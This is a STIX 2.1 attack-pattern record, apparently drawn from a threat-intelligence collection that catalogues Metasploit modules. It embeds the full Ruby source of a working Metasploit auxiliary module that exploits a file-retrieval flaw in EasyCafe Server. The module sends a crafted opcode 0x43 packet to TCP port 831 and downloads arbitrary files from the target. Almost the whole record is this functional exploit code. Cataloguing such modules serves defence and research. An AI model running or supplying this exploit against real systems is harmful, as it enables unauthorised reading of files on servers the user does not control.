{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97c9929b-4f5f-44fc-ba75-3e9e42f49d61",
    "created": "2024-08-14T16:27:03.802149Z",
    "modified": "2024-08-14T16:27:03.802153Z",
    "name": "EasyCafe Server Remote File Access",
    "description": " This module exploits a file retrieval vulnerability in EasyCafe Server. The vulnerability can be triggered by sending a specially crafted packet (opcode 0x43) to the 831/TCP port. This module has been successfully tested on EasyCafe Server version 2.2.14 (Trial mode and Demo mode) on Windows XP SP3 and Windows 7 SP1. Note that the server will throw a popup messagebox if the specified file does not exist.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/easycafe_server_fileaccess.rb",
            "external_id": "easycafe_server_fileaccess.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'EasyCafe Server Remote File Access',\n      'Description' => %q{\n          This module exploits a file retrieval vulnerability in\n        EasyCafe Server. The vulnerability can be triggered by\n        sending a specially crafted packet (opcode 0x43) to the\n        831/TCP port.\n        This module has been successfully tested on EasyCafe Server\n        version 2.2.14 (Trial mode and Demo mode) on Windows XP SP3\n        and Windows 7 SP1.\n        Note that the server will throw a popup messagebox if the\n        specified file does not exist.\n      },\n      'License'     => MSF_LICENSE,\n      'Author'      =>\n        [\n          'R-73eN', # Vulnerability Discovery\n          'bcoles' # Metasploit module\n        ],\n      'References'  =>\n        [\n          [ 'EDB', '39102' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(831),\n        OptString.new('FILEPATH', [true, 'The path of the file to download', 'C:\\\\WINDOWS\\\\system32\\\\drivers\\\\etc\\\\hosts'])\n      ])\n  end\n\n  def get_file\n    res = sock.get_once\n    unless res\n      print_error(\"Unable to retrieve file due to a timeout.\")\n      return\n    end\n\n    unless res.length == 261\n      print_error(\"Received a response of an invalid size.\")\n      return\n    end\n\n    file_size = res.unpack('@256V')[0]\n    contents = ''\n    while contents.length < file_size\n      contents << sock.get_once\n    end\n\n    print_good(\"File retrieved successfully (#{contents.length} bytes)!\")\n    contents\n  end\n\n  def run_host(ip)\n    file_path = datastore['FILEPATH']\n    if file_path.length > 67\n      print_error(\"File path is longer than 67 characters. Try using MS-DOS 8.3 short file names.\")\n      return\n    end\n\n    packet = \"\\x43\"\n    packet << file_path\n    packet << \"\\x00\" * (255 - file_path.length)\n    packet << \"\\x01\\x00\\x00\\x00\\x01\"\n\n    vprint_status(\"Sending request (#{packet.length} bytes)\")\n    connect\n    sock.put(packet)\n\n    contents = get_file\n    disconnect\n    return if contents.nil?\n\n    path = store_loot(\n      'easycafe_server',\n      'application/octet-stream',\n      ip,\n      contents,\n      File.basename(file_path)\n    )\n    print_status(\"File saved in: #{path}\")\n  end\nend\n"
}